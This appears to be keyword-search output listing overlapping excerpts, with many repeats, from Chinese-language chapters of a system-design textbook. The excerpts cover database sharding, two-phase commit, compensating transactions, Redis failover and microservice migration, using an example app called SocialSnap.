  c12_b07.md: ...：** 如果所有 shard 都投“yes”，协调器发送“提交”。每个 shard 应用已准备的变更并释放锁。如果任何 shard 投“no”，协调器向所有 shard 发送“中止”，它们丢弃已准备的变更。  如果协调器在第一阶段后、第二阶段前故障会...
  c12_b07.md: ...es”，协调器发送“提交”。每个 shard 应用已准备的变更并释放锁。如果任何 shard 投“no”，协调器向所有 shard 发送“中止”，它们丢弃已准备的变更。  如果协调器在第一阶段后、第二阶段前故障会怎样？参与 shard 会卡在持有已准...
  c12_b07.md: ...，协调器向所有 shard 发送“中止”，它们丢弃已准备的变更。  如果协调器在第一阶段后、第二阶段前故障会怎样？参与 shard 会卡在持有已准备数据的锁上，等待永远不会到达的提交或中止。系统处于**阻塞**状态——其他触及相同数据的事务必须等待。...
  c12_b07.md: ...滚——支付记录消失，用户仍是非高级。数据库保证原子性。  分片后，`payments` 和 `users` 可能在不同 shard（如果按不同 key 分片），也可能在同一 shard（如果都按 `user_id` 分片）。SocialSnap 的情...
  c12_b07.md: ...分片后，`payments` 和 `users` 可能在不同 shard（如果按不同 key 分片），也可能在同一 shard（如果都按 `user_id` 分片）。SocialSnap 的情况中，两张表都按 `user_id` 分片，因此同一用...
  c12_b07.md: ...er_id` 分片）。SocialSnap 的情况中，两张表都按 `user_id` 分片，因此同一用户的数据落在同一 shard——这个特定问题被避免了。  但考虑转账操作：用户 Alice（Shard 1）给用户 Bob（Shard 3）送礼。扣...
  c12_b07.md: ...余额，增加 Bob 余额。这些更新必须原子——不能扣了 Alice 却没加到 Bob，让钱消失在虚空中。Alice 在 Shard 1、Bob 在 Shard 3，这就是**分布式事务（distributed transaction）**。   ##...
  c12_b07.md: ...些更新必须原子——不能扣了 Alice 却没加到 Bob，让钱消失在虚空中。Alice 在 Shard 1、Bob 在 Shard 3，这就是**分布式事务（distributed transaction）**。   #### 定义：分布式事务  *...
  c12_b07.md: ...C）**。一个**协调器（coordinator）**编排事务：  1. **第一阶段（准备）：** 协调器向每个参与 shard 发送“准备”消息。每个 shard 把拟议变更写到临时区域，并承诺（投“yes”）可以提交。如果任何 shard 不能...
  c12_b07.md: ...inator）**编排事务：  1. **第一阶段（准备）：** 协调器向每个参与 shard 发送“准备”消息。每个 shard 把拟议变更写到临时区域，并承诺（投“yes”）可以提交。如果任何 shard 不能提交（如约束冲突或故障），它投“no...
  c12_b07.md: ...参与 shard 发送“准备”消息。每个 shard 把拟议变更写到临时区域，并承诺（投“yes”）可以提交。如果任何 shard 不能提交（如约束冲突或故障），它投“no”。  2. **第二阶段（提交）：** 如果所有 shard 都投“yes”...
  c12_b07.md: ...提交。如果任何 shard 不能提交（如约束冲突或故障），它投“no”。  2. **第二阶段（提交）：** 如果所有 shard 都投“yes”，协调器发送“提交”。每个 shard 应用已准备的变更并释放锁。如果任何 shard 投“no”，协调...
  c12_b07.md: ...），它投“no”。  2. **第二阶段（提交）：** 如果所有 shard 都投“yes”，协调器发送“提交”。每个 shard 应用已准备的变更并释放锁。如果任何 shard 投“no”，协调器向所有 shard 发送“中止”，它们丢弃已准备的变...
  c12_b07.md: ...：** 如果所有 shard 都投“yes”，协调器发送“提交”。每个 shard 应用已准备的变更并释放锁。如果任何 shard 投“no”，协调器向所有 shard 发送“中止”，它们丢弃已准备的变更。  如果协调器在第一阶段后、第二阶段前故障会...
  c12_b07.md: ...es”，协调器发送“提交”。每个 shard 应用已准备的变更并释放锁。如果任何 shard 投“no”，协调器向所有 shard 发送“中止”，它们丢弃已准备的变更。  如果协调器在第一阶段后、第二阶段前故障会怎样？参与 shard 会卡在持有已准...
  c12_b07.md: ...，协调器向所有 shard 发送“中止”，它们丢弃已准备的变更。  如果协调器在第一阶段后、第二阶段前故障会怎样？参与 shard 会卡在持有已准备数据的锁上，等待永远不会到达的提交或中止。系统处于**阻塞**状态——其他触及相同数据的事务必须等待。...
  c12_b08.md: ...NewSQL 系统在简单操作上比单节点数据库慢。  对需要水平扩展和强事务保证的团队，NewSQL 是真正选项。对跨 shard 事务需求很少且能在架构上避免它们的团队，NewSQL 可能杀鸡用牛刀。  更深教训：**设计分片策略时，把必须事务一致...
  c12_b08.md: ...**设计分片策略时，把必须事务一致的数据共置（co-locate）。** 如果 Alice 的余额和交易历史始终在同一 shard（因为都按 `user_id` 分片），大多数操作就不需分布式事务。那些确实需要的——用户间转账——可以用应用层协议处理...
  c12_b09.md: ...发重复提交。  **Q3.** 基于范围和基于哈希的分片有什么区别？各举一个优点。  **答案：** 基于范围的分片按 shard key 的值范围分配记录（例如 user ID 1–1,000,000 在 Shard 1）。优点：支持高效范围查询—...
  c12_b09.md: ...*答案：** 基于范围的分片按 shard key 的值范围分配记录（例如 user ID 1–1,000,000 在 Shard 1）。优点：支持高效范围查询——查找 key 范围内的所有记录只需接触一个或几个 shard。基于哈希的分片对 sha...
  c12_b09.md: ...–1,000,000 在 Shard 1）。优点：支持高效范围查询——查找 key 范围内的所有记录只需接触一个或几个 shard。基于哈希的分片对 shard key 应用哈希函数并用结果选择 shard（例如 `user_id % N`）。优点：...
  c12_b09.md: ...ard 1）。优点：支持高效范围查询——查找 key 范围内的所有记录只需接触一个或几个 shard。基于哈希的分片对 shard key 应用哈希函数并用结果选择 shard（例如 `user_id % N`）。优点：使数据在 shard 间大致均...
  c12_b09.md: ...key 范围内的所有记录只需接触一个或几个 shard。基于哈希的分片对 shard key 应用哈希函数并用结果选择 shard（例如 `user_id % N`）。优点：使数据在 shard 间大致均匀分布，消除单调递增 key 造成的热 sha...
  c12_b09.md: ...的分片对 shard key 应用哈希函数并用结果选择 shard（例如 `user_id % N`）。优点：使数据在 shard 间大致均匀分布，消除单调递增 key 造成的热 shard。  **Q4.** 为什么重分片昂贵，减少重分片频率的一种...
  c12_b09.md: ...ard（例如 `user_id % N`）。优点：使数据在 shard 间大致均匀分布，消除单调递增 key 造成的热 shard。  **Q4.** 为什么重分片昂贵，减少重分片频率的一种策略是什么？  **答案：** 重分片昂贵，因为改变 sha...
  c12_b09.md: ...ard。  **Q4.** 为什么重分片昂贵，减少重分片频率的一种策略是什么？  **答案：** 重分片昂贵，因为改变 shard 数量会改变大部分或全部记录的哈希映射。8 个 shard 时 `user_id % 8` 下在 Shard 3 的记录...
  c12_b09.md: ...率的一种策略是什么？  **答案：** 重分片昂贵，因为改变 shard 数量会改变大部分或全部记录的哈希映射。8 个 shard 时 `user_id % 8` 下在 Shard 3 的记录，加 1 个 shard 到 `user_id % 9`...
  c12_b09.md: ...，因为改变 shard 数量会改变大部分或全部记录的哈希映射。8 个 shard 时 `user_id % 8` 下在 Shard 3 的记录，加 1 个 shard 到 `user_id % 9` 后可能属于 Shard 6。几乎每条记录都需要评估...
  c12_b09.md: ...部分或全部记录的哈希映射。8 个 shard 时 `user_id % 8` 下在 Shard 3 的记录，加 1 个 shard 到 `user_id % 9` 后可能属于 Shard 6。几乎每条记录都需要评估并可能移动。数据量数百 GB 或 T...
  c12_b09.md: ...er_id % 8` 下在 Shard 3 的记录，加 1 个 shard 到 `user_id % 9` 后可能属于 Shard 6。几乎每条记录都需要评估并可能移动。数据量数百 GB 或 TB 时，这是大型、高风险、耗时的实时迁移。  一种常见缓...
  c12_b09.md: ...并可能移动。数据量数百 GB 或 TB 时，这是大型、高风险、耗时的实时迁移。  一种常见缓解是早期配置远超当前需要的 shard（例如 8 台物理机上的 64 个逻辑 shard）。需要更多容量时，把逻辑 shard 移到新物理机，而不改变逻辑 s...
  c12_b09.md: ...型、高风险、耗时的实时迁移。  一种常见缓解是早期配置远超当前需要的 shard（例如 8 台物理机上的 64 个逻辑 shard）。需要更多容量时，把逻辑 shard 移到新物理机，而不改变逻辑 shard 数量或哈希映射。一致性哈希也能在容量变化...
  c12_b09.md: ...见缓解是早期配置远超当前需要的 shard（例如 8 台物理机上的 64 个逻辑 shard）。需要更多容量时，把逻辑 shard 移到新物理机，而不改变逻辑 shard 数量或哈希映射。一致性哈希也能在容量变化时减少数据移动。...
  c12_b09.md: ...d（例如 8 台物理机上的 64 个逻辑 shard）。需要更多容量时，把逻辑 shard 移到新物理机，而不改变逻辑 shard 数量或哈希映射。一致性哈希也能在容量变化时减少数据移动。...
  c12_b09.md: ...发重复提交。  **Q3.** 基于范围和基于哈希的分片有什么区别？各举一个优点。  **答案：** 基于范围的分片按 shard key 的值范围分配记录（例如 user ID 1–1,000,000 在 Shard 1）。优点：支持高效范围查询—...
  c12_b09.md: ...*答案：** 基于范围的分片按 shard key 的值范围分配记录（例如 user ID 1–1,000,000 在 Shard 1）。优点：支持高效范围查询——查找 key 范围内的所有记录只需接触一个或几个 shard。基于哈希的分片对 sha...
  c12_b09.md: ...–1,000,000 在 Shard 1）。优点：支持高效范围查询——查找 key 范围内的所有记录只需接触一个或几个 shard。基于哈希的分片对 shard key 应用哈希函数并用结果选择 shard（例如 `user_id % N`）。优点：...
  c12_b09.md: ...ard 1）。优点：支持高效范围查询——查找 key 范围内的所有记录只需接触一个或几个 shard。基于哈希的分片对 shard key 应用哈希函数并用结果选择 shard（例如 `user_id % N`）。优点：使数据在 shard 间大致均...
  c12_b09.md: ...key 范围内的所有记录只需接触一个或几个 shard。基于哈希的分片对 shard key 应用哈希函数并用结果选择 shard（例如 `user_id % N`）。优点：使数据在 shard 间大致均匀分布，消除单调递增 key 造成的热 sha...
  c12_b09.md: ...的分片对 shard key 应用哈希函数并用结果选择 shard（例如 `user_id % N`）。优点：使数据在 shard 间大致均匀分布，消除单调递增 key 造成的热 shard。  **Q4.** 为什么重分片昂贵，减少重分片频率的一种...
  c12_b09.md: ...ard（例如 `user_id % N`）。优点：使数据在 shard 间大致均匀分布，消除单调递增 key 造成的热 shard。  **Q4.** 为什么重分片昂贵，减少重分片频率的一种策略是什么？  **答案：** 重分片昂贵，因为改变 sha...
  c12_b09.md: ...ard。  **Q4.** 为什么重分片昂贵，减少重分片频率的一种策略是什么？  **答案：** 重分片昂贵，因为改变 shard 数量会改变大部分或全部记录的哈希映射。8 个 shard 时 `user_id % 8` 下在 Shard 3 的记录...
  c12_b09.md: ...率的一种策略是什么？  **答案：** 重分片昂贵，因为改变 shard 数量会改变大部分或全部记录的哈希映射。8 个 shard 时 `user_id % 8` 下在 Shard 3 的记录，加 1 个 shard 到 `user_id % 9`...
  c12_b09.md: ...，因为改变 shard 数量会改变大部分或全部记录的哈希映射。8 个 shard 时 `user_id % 8` 下在 Shard 3 的记录，加 1 个 shard 到 `user_id % 9` 后可能属于 Shard 6。几乎每条记录都需要评估...
  c12_b09.md: ...部分或全部记录的哈希映射。8 个 shard 时 `user_id % 8` 下在 Shard 3 的记录，加 1 个 shard 到 `user_id % 9` 后可能属于 Shard 6。几乎每条记录都需要评估并可能移动。数据量数百 GB 或 T...
  c12_b09.md: ...er_id % 8` 下在 Shard 3 的记录，加 1 个 shard 到 `user_id % 9` 后可能属于 Shard 6。几乎每条记录都需要评估并可能移动。数据量数百 GB 或 TB 时，这是大型、高风险、耗时的实时迁移。  一种常见缓...
  c12_b09.md: ...并可能移动。数据量数百 GB 或 TB 时，这是大型、高风险、耗时的实时迁移。  一种常见缓解是早期配置远超当前需要的 shard（例如 8 台物理机上的 64 个逻辑 shard）。需要更多容量时，把逻辑 shard 移到新物理机，而不改变逻辑 s...
  c12_b09.md: ...型、高风险、耗时的实时迁移。  一种常见缓解是早期配置远超当前需要的 shard（例如 8 台物理机上的 64 个逻辑 shard）。需要更多容量时，把逻辑 shard 移到新物理机，而不改变逻辑 shard 数量或哈希映射。一致性哈希也能在容量变化...
  c12_b09.md: ...见缓解是早期配置远超当前需要的 shard（例如 8 台物理机上的 64 个逻辑 shard）。需要更多容量时，把逻辑 shard 移到新物理机，而不改变逻辑 shard 数量或哈希映射。一致性哈希也能在容量变化时减少数据移动。...
  c12_b09.md: ...d（例如 8 台物理机上的 64 个逻辑 shard）。需要更多容量时，把逻辑 shard 移到新物理机，而不改变逻辑 shard 数量或哈希映射。一致性哈希也能在容量变化时减少数据移动。...
  c12_b10.md: ...点赞数最高的 10 位用户”。描述在分片系统中如何执行该查询，并估算与单数据库系统相比的运维开销。  提示  想想哪些 shard 持有哪些用户的数据，以及找到全球前 10 需要哪些步骤。  **答案：** 单数据库系统中，这是对 `posts` 表...
  c12_b10.md: ...10 需要哪些步骤。  **答案：** 单数据库系统中，这是对 `posts` 表的简单聚合查询。分片系统中，没有一个 shard 拥有所有用户的完整视图。应用必须：  1. 把查询扇出到全部 8 个 shard：`SELECT user_id, S...
  c12_b10.md: ...的简单聚合查询。分片系统中，没有一个 shard 拥有所有用户的完整视图。应用必须：  1. 把查询扇出到全部 8 个 shard：`SELECT user_id, SUM(like_count) FROM posts WHERE created_a...
  c12_b10.md: ...ORDER BY SUM(like_count) DESC LIMIT 10`。 2. 收到 8 个结果集，每个包含该 shard 的前 10（最多 80 条结果）。 3. 在应用代码中合并这些结果，找出真正的全球前 10。  开销：数据库查询数量是...
  c12_b10.md: ...条结果）。 3. 在应用代码中合并这些结果，找出真正的全球前 10。  开销：数据库查询数量是 8 倍，到全部 8 个 shard 的网络往返，以及应用端合并逻辑。完成时间大致等于最慢 shard 的查询时间（串行瓶颈）加上合并时间。每周调用不频繁的...
  c12_b10.md: ...。  开销：数据库查询数量是 8 倍，到全部 8 个 shard 的网络往返，以及应用端合并逻辑。完成时间大致等于最慢 shard 的查询时间（串行瓶颈）加上合并时间。每周调用不频繁的排行榜可接受。实时排行榜若每页都查，这种扇出模式太慢太贵——团队通...
  c12_b10.md: ...合数据。  **Q2.** 一个团队正在设计支付系统，“扣账户 A、贷账户 B”必须原子。账户 A 和账户 B 在不同 shard。解释两种无需完整 2PC 实现的不同处理思路，并说明各自的 tradeoff（权衡）。  提示  想想如果一步成功另一...
  c12_b10.md: ...一步失败会发生什么。有哪些补偿动作可行？  **答案：** 两种思路：  **思路 1：幂等重试加补偿事务。** 先在 Shard A 执行扣款。如果成功，再尝试在 Shard B 贷记。如果贷记失败（网络错误、崩溃），用幂等键（idempotenc...
  c12_b10.md: ...*答案：** 两种思路：  **思路 1：幂等重试加补偿事务。** 先在 Shard A 执行扣款。如果成功，再尝试在 Shard B 贷记。如果贷记失败（网络错误、崩溃），用幂等键（idempotency key，幂等性）重试——贷记操作被设计为可...
  c12_b10.md: ...idempotency key，幂等性）重试——贷记操作被设计为可安全重试多次。如果重试耗尽，发出补偿事务（冲正）撤销 Shard A 的扣款。tradeoff：在扣款成功和贷记成功之间的窗口，钱“在途”——已离开 A 但尚未到 B。这个中间状态必须...
  c12_b10.md: ...把 A 扣到一个锁定的“托管”记录里，然后贷记 B，再释放托管。如果贷记失败，托管被退回。托管记录充当本地锁，消除了跨 shard 原子协调的需求——每一步都是单 shard 操作。tradeoff：每笔转账操作更多（3 步而不是 2 步），托管记录...
  c12_b10.md: ...记 B，再释放托管。如果贷记失败，托管被退回。托管记录充当本地锁，消除了跨 shard 原子协调的需求——每一步都是单 shard 操作。tradeoff：每笔转账操作更多（3 步而不是 2 步），托管记录必须小心管理以避免孤儿托管条目。  **Q3...
  c12_b10.md: ...管条目。  **Q3.** SocialSnap 把 `username` 字段反规范化到 `posts` 表以避免跨 shard JOIN。用户修改用户名。写出更新过程的伪代码，并指出该过程可能以两种方式失败并导致系统不一致。...
  c12_b10.md: ...点赞数最高的 10 位用户”。描述在分片系统中如何执行该查询，并估算与单数据库系统相比的运维开销。  提示  想想哪些 shard 持有哪些用户的数据，以及找到全球前 10 需要哪些步骤。  **答案：** 单数据库系统中，这是对 `posts` 表...
  c12_b10.md: ...10 需要哪些步骤。  **答案：** 单数据库系统中，这是对 `posts` 表的简单聚合查询。分片系统中，没有一个 shard 拥有所有用户的完整视图。应用必须：  1. 把查询扇出到全部 8 个 shard：`SELECT user_id, S...
  c12_b10.md: ...的简单聚合查询。分片系统中，没有一个 shard 拥有所有用户的完整视图。应用必须：  1. 把查询扇出到全部 8 个 shard：`SELECT user_id, SUM(like_count) FROM posts WHERE created_a...
  c12_b10.md: ...ORDER BY SUM(like_count) DESC LIMIT 10`。 2. 收到 8 个结果集，每个包含该 shard 的前 10（最多 80 条结果）。 3. 在应用代码中合并这些结果，找出真正的全球前 10。  开销：数据库查询数量是...
  c12_b10.md: ...条结果）。 3. 在应用代码中合并这些结果，找出真正的全球前 10。  开销：数据库查询数量是 8 倍，到全部 8 个 shard 的网络往返，以及应用端合并逻辑。完成时间大致等于最慢 shard 的查询时间（串行瓶颈）加上合并时间。每周调用不频繁的...
  c12_b10.md: ...。  开销：数据库查询数量是 8 倍，到全部 8 个 shard 的网络往返，以及应用端合并逻辑。完成时间大致等于最慢 shard 的查询时间（串行瓶颈）加上合并时间。每周调用不频繁的排行榜可接受。实时排行榜若每页都查，这种扇出模式太慢太贵——团队通...
  c12_b10.md: ...合数据。  **Q2.** 一个团队正在设计支付系统，“扣账户 A、贷账户 B”必须原子。账户 A 和账户 B 在不同 shard。解释两种无需完整 2PC 实现的不同处理思路，并说明各自的 tradeoff（权衡）。  提示  想想如果一步成功另一...
  c12_b10.md: ...一步失败会发生什么。有哪些补偿动作可行？  **答案：** 两种思路：  **思路 1：幂等重试加补偿事务。** 先在 Shard A 执行扣款。如果成功，再尝试在 Shard B 贷记。如果贷记失败（网络错误、崩溃），用幂等键（idempotenc...
  c12_b10.md: ...*答案：** 两种思路：  **思路 1：幂等重试加补偿事务。** 先在 Shard A 执行扣款。如果成功，再尝试在 Shard B 贷记。如果贷记失败（网络错误、崩溃），用幂等键（idempotency key，幂等性）重试——贷记操作被设计为可...
  c12_b10.md: ...idempotency key，幂等性）重试——贷记操作被设计为可安全重试多次。如果重试耗尽，发出补偿事务（冲正）撤销 Shard A 的扣款。tradeoff：在扣款成功和贷记成功之间的窗口，钱“在途”——已离开 A 但尚未到 B。这个中间状态必须...
  c12_b10.md: ...把 A 扣到一个锁定的“托管”记录里，然后贷记 B，再释放托管。如果贷记失败，托管被退回。托管记录充当本地锁，消除了跨 shard 原子协调的需求——每一步都是单 shard 操作。tradeoff：每笔转账操作更多（3 步而不是 2 步），托管记录...
  c12_b10.md: ...记 B，再释放托管。如果贷记失败，托管被退回。托管记录充当本地锁，消除了跨 shard 原子协调的需求——每一步都是单 shard 操作。tradeoff：每笔转账操作更多（3 步而不是 2 步），托管记录必须小心管理以避免孤儿托管条目。  **Q3...
  c12_b10.md: ...管条目。  **Q3.** SocialSnap 把 `username` 字段反规范化到 `posts` 表以避免跨 shard JOIN。用户修改用户名。写出更新过程的伪代码，并指出该过程可能以两种方式失败并导致系统不一致。...
  c12_b11.md: ...ers SET username = 'new_name' WHERE user_id = 42;  // 在用户所在 shard     2. 对每个 shard (0..7):          UPDATE posts SET author_u...
  c12_b11.md: ...= 'new_name' WHERE user_id = 42;  // 在用户所在 shard     2. 对每个 shard (0..7):          UPDATE posts SET author_username = 'new_na...
  c12_b11.md: ...的缓存条目失效（见第 7 章）。   失败场景：  **失败 1：** 应用在完成第 1 步后、但在完成第 2 步所有 shard 前崩溃。`users` 表显示新用户名，但某些 shard 的 `posts` 表仍显示旧用户名。用户现在看到旧帖子上...
  c12_b11.md: ...1：** 应用在完成第 1 步后、但在完成第 2 步所有 shard 前崩溃。`users` 表显示新用户名，但某些 shard 的 `posts` 表仍显示旧用户名。用户现在看到旧帖子上是旧用户名，新帖子上是新用户名——不一致。这是部分更新失败。...
  c12_b11.md: ...不一致。这是部分更新失败。  **失败 2：** 第 2 步很慢（用户 42 有数百万帖子）。第 2 步运行期间，有些 shard 已更新，有些还没有。跨 shard 的查询返回混合用户名值的帖子。读者看到系统不一致的快照。  两个失败都说明为什么反...
  c12_b11.md: ...败 2：** 第 2 步很慢（用户 42 有数百万帖子）。第 2 步运行期间，有些 shard 已更新，有些还没有。跨 shard 的查询返回混合用户名值的帖子。读者看到系统不一致的快照。  两个失败都说明为什么反规范化是维护负担：规范化 schem...
  c12_b11.md: ...看到系统不一致的快照。  两个失败都说明为什么反规范化是维护负担：规范化 schema 下单一原子操作，变成多步骤、跨 shard 并带有一致性窗口的过程。...
  c12_b12.md: ...#### 深入思考  **Q1.** 一位同事主张：“分片时我们应该始终按主键分片。它分布最均匀，也能消除热 shard。”评价这个论点。什么时候正确，什么时候会导致问题？  **讨论：** 这个论点部分正确，但忽略了访问模式。按主键并配合...
  c12_b12.md: ...模式。按主键并配合好的哈希函数确实能产生均匀分布。但分片的目的不仅是均匀分布数据——更是确保最常见的查询接触尽可能少的 shard。  考虑一个社交网络，最常见查询是“获取某用户的所有帖子”。如果帖子按 post_id（主键）分片，单个用户的帖子就分...
  c12_b12.md: ...一个社交网络，最常见查询是“获取某用户的所有帖子”。如果帖子按 post_id（主键）分片，单个用户的帖子就分散在所有 shard。每次取用户 feed 都要扇出到所有 shard。如果改为按 user_id 分片，同一用户的所有帖子都在一个 sha...
  c12_b12.md: ...。如果帖子按 post_id（主键）分片，单个用户的帖子就分散在所有 shard。每次取用户 feed 都要扇出到所有 shard。如果改为按 user_id 分片，同一用户的所有帖子都在一个 shard——最常见查询是单 shard 操作。  这位...
  c12_b12.md: ...ard。每次取用户 feed 都要扇出到所有 shard。如果改为按 user_id 分片，同一用户的所有帖子都在一个 shard——最常见查询是单 shard 操作。  这位同事的建议以查询局部性为代价优化数据分布。正确原则是：按使最常见查询成为单...
  c12_b12.md: ...都要扇出到所有 shard。如果改为按 user_id 分片，同一用户的所有帖子都在一个 shard——最常见查询是单 shard 操作。  这位同事的建议以查询局部性为代价优化数据分布。正确原则是：按使最常见查询成为单 shard 的属性分片。对社...
  c12_b12.md: ...—最常见查询是单 shard 操作。  这位同事的建议以查询局部性为代价优化数据分布。正确原则是：按使最常见查询成为单 shard 的属性分片。对社交数据，通常是拥有数据的用户。  **Q2.** NewSQL 数据库如 CockroachDB 和...
  c12_b12.md: ...D 事务又需要水平扩展，且能容忍其延迟和运维复杂度时，NewSQL 合适。对工作负载读重（用副本）或写入自然可分片且跨 shard 事务很少时，传统分片可能更简单更快。...
  c12_b13.md: ...（需要扇出和合并）、重分片复杂度（改变 shard 数量昂贵）以及跨表 JOIN 的丧失。  分布式事务——必须跨多个 shard 原子的操作——是分片系统最深的痛。两阶段提交提供协议但引入阻塞和延迟。NewSQL 数据库把复杂度内部化，但代价是更高...
  c13_b01.md: ...第 12 章中，SocialSnap 对数据库分片以处理写入量。跨分片查询问题立即出现：查询跨越多个 shard 的数据需要在应用代码中写扇出逻辑，跨 shard JOIN 在单次 SQL 查询中基本不可能。团队发现自己在写数据库过...
  c13_b01.md: ...ap 对数据库分片以处理写入量。跨分片查询问题立即出现：查询跨越多个 shard 的数据需要在应用代码中写扇出逻辑，跨 shard JOIN 在单次 SQL 查询中基本不可能。团队发现自己在写数据库过去自动做的事。  但想想：如果问题不是分片策略而是...
  c17_b08.md: ...高”的 runbook 可能说：  1. 在 Redis 仪表盘检查 Redis 集群状态 2. 检查问题是否限于一个 shard 还是影响所有 shard 3. 如果是一个 shard：把副本提升为主库（链接到流程） 4. 如果是所有 shard：...
  c17_b08.md: ...能说：  1. 在 Redis 仪表盘检查 Redis 集群状态 2. 检查问题是否限于一个 shard 还是影响所有 shard 3. 如果是一个 shard：把副本提升为主库（链接到流程） 4. 如果是所有 shard：检查最近 Redis 部署...
  c17_b08.md: ...仪表盘检查 Redis 集群状态 2. 检查问题是否限于一个 shard 还是影响所有 shard 3. 如果是一个 shard：把副本提升为主库（链接到流程） 4. 如果是所有 shard：检查最近 Redis 部署；如果 30 分钟内部署过，回...
  c17_b08.md: ...shard 还是影响所有 shard 3. 如果是一个 shard：把副本提升为主库（链接到流程） 4. 如果是所有 shard：检查最近 Redis 部署；如果 30 分钟内部署过，回滚 5. 如果最近没有部署：上报数据库团队；把 Redis 客...
  c17_b09.md: ...dis'` 的 ERROR 日志。”他们看到 847 条错误。查看 Redis 仪表盘，发现有一个 Redis 节点——shard 2 的主库——内存压力异常高。他们发起 shard 2 到其副本的故障转移。  到 2:51——降级开始四分钟——Re...
  c17_b09.md: ...条错误。查看 Redis 仪表盘，发现有一个 Redis 节点——shard 2 的主库——内存压力异常高。他们发起 shard 2 到其副本的故障转移。  到 2:51——降级开始四分钟——Redis shard 2 恢复健康。错误率回到正常。熔...
  c17_b09.md: ...主库——内存压力异常高。他们发起 shard 2 到其副本的故障转移。  到 2:51——降级开始四分钟——Redis shard 2 恢复健康。错误率回到正常。熔断器闭合。feed 恢复完整质量。用户总影响：数据在 shard 2 上的用户经历 4...
  c17_b09.md: ...四分钟——Redis shard 2 恢复健康。错误率回到正常。熔断器闭合。feed 恢复完整质量。用户总影响：数据在 shard 2 上的用户经历 4 分钟略陈旧的 feed。没有 503 错误。没有完整 outage。  未观测到的周二 outa...

=== service (205 occurrences) ===
  c02_b10.md: ...Step 3（第三步）：架构改动。**  把通知服务从同步结账路径移除。从：       User → Payment Service → Notification Service → "Order confirmed"   改成异步模式：...
  c02_b10.md: ...知服务从同步结账路径移除。从：       User → Payment Service → Notification Service → "Order confirmed"   改成异步模式：       User → Payment Service...
  c02_b10.md: ...Service → "Order confirmed"   改成异步模式：       User → Payment Service → (publish "order placed" event to queue) → "Order confirme...
  c02_b10.md: ...(asynchronously)                              Notification Service (consumes event, sends email)...
  c08_b04.md: ...订阅者互不知晓；他们只知道报纸。  SocialSnap 注册场景中：       Publisher (Signup Service)         ↓     publishes "user.signup" event to topic...
  c08_b04.md: ...↓     Message Broker         ├── delivers to Email Service (subscriber)         ├── delivers to Analytics Service (sub...
  c08_b04.md: ...mail Service (subscriber)         ├── delivers to Analytics Service (subscriber)         ├── delivers to Contact Notification S...
  c08_b04.md: ...e (subscriber)         ├── delivers to Contact Notification Service (subscriber)         └── delivers to Onboarding Service (su...
  c08_b04.md: ...ion Service (subscriber)         └── delivers to Onboarding Service (subscriber)   注册服务发布一个事件。四个消费者都收到。添加新消费者（如反欺诈服务）不需要修改注册服务—...
  c09_b09.md: ...—一种二进制协议格式，比 JSON 紧凑得多、解析更快。  gRPC 的 Protobuf 服务定义示例：       service UserService {       rpc GetUser (GetUserRequest) returns (U...
  c13_b10.md: ...料团队——每个团队有自己的 Slack 频道、路线图和 on-call 轮值——他们产生的系统自然会有 Payment Service、Notification Service 和 User Service。这些团队主要通过定义好的接口（API、工单）沟...
  c13_b10.md: ...道、路线图和 on-call 轮值——他们产生的系统自然会有 Payment Service、Notification Service 和 User Service。这些团队主要通过定义好的接口（API、工单）沟通，所以他们的软件组件也通过定义好的接口沟...
  c13_b10.md: ...轮值——他们产生的系统自然会有 Payment Service、Notification Service 和 User Service。这些团队主要通过定义好的接口（API、工单）沟通，所以他们的软件组件也通过定义好的接口沟通。反之，如果工程组织是一个大...
  c13_b12.md: ...用绞杀者无花果模式的分步计划：  **第 1 步：定义契约。** 在写任何服务代码前，先定义 Notification Service 将暴露的 API。Posts Service 如何通知它帖子已创建？通过消息队列（推荐）还是直接 HTTP 调用？决策...
  c13_b12.md: ...步：定义契约。** 在写任何服务代码前，先定义 Notification Service 将暴露的 API。Posts Service 如何通知它帖子已创建？通过消息队列（推荐）还是直接 HTTP 调用？决策：使用第 8 章的消息队列——帖子创建时发布...
  c13_b12.md: ...？决策：使用第 8 章的消息队列——帖子创建时发布 `post.created` 事件到队列；Notification Service 消费该事件。  **第 2 步：增加事件发布但不删除旧代码。** 修改帖子创建代码，在直接插入 `notificati...
  c13_b12.md: ...eated` 事件到队列。两条路径同时运行。这很安全，对用户无影响。  **第 3 步：构建 Notification Service。** Notification Service 消费 `post.created` 事件并插入自己的 `notific...
  c13_b12.md: ...安全，对用户无影响。  **第 3 步：构建 Notification Service。** Notification Service 消费 `post.created` 事件并插入自己的 `notifications` 表。部署它并验证它正确创建通知。...
  c13_b12.md: ...` 表现在可能被重复创建（旧代码和新服务都在插入），但过渡期可接受。  **第 4 步：验证 Notification Service 正确。** 并行运行两条路径一段时间（几天或几周）。监控旧路径和新路径创建的通知差异。修复 Notification...
  c13_b12.md: ...正确。** 并行运行两条路径一段时间（几天或几周）。监控旧路径和新路径创建的通知差异。修复 Notification Service 中的 bug。  **第 5 步：移除旧直接数据库访问。** 确信 Notification Service 正确后，...
  c13_b12.md: ...tion Service 中的 bug。  **第 5 步：移除旧直接数据库访问。** 确信 Notification Service 正确后，从帖子创建代码中删除直接插入 `notifications` 表的逻辑。帖子创建代码现在只向队列发布事件。No...
  c13_b12.md: ...码中删除直接插入 `notifications` 表的逻辑。帖子创建代码现在只向队列发布事件。Notification Service 现在是 notifications 表的唯一写入者。  **第 6 步：迁移通知数据存储。** 由于单体的 `noti...
  c13_b12.md: ...*第 6 步：迁移通知数据存储。** 由于单体的 `notifications` 表现在只由 Notification Service 读写，把它迁移到 Notification Service 自己的数据库实例。更新 Notification Serv...
  c13_b12.md: ...fications` 表现在只由 Notification Service 读写，把它迁移到 Notification Service 自己的数据库实例。更新 Notification Service 的连接配置。Posts Service 不再引用 `...
  c13_b12.md: ...vice 读写，把它迁移到 Notification Service 自己的数据库实例。更新 Notification Service 的连接配置。Posts Service 不再引用 `notifications` 表。  迁移全程没有停机。迁移是增量...
  c13_b12.md: ...cation Service 自己的数据库实例。更新 Notification Service 的连接配置。Posts Service 不再引用 `notifications` 表。  迁移全程没有停机。迁移是增量的，每一步都有安全的回滚路径。...
  c13_b13.md: ...Buffers 在端到端延迟上差别可忽略。  在特定场景下这个说法会崩：  **高容量服务间通信：** 如果 User Service 每秒处理 100,000 次请求，每次都需要序列化和反序列化中等复杂度的 JSON 对象（比如 2-5 KB），JSO...
  c15_b01.md: ...体的、把所有铺垫结晶的操作。  用户点击“升级到高级版”。应用必须做三件事：  1. 向用户信用卡收费（Payment Service）。 2. 更新用户账户，设置 `is_premium = true`（User Service）。 3. 发送“欢迎加...
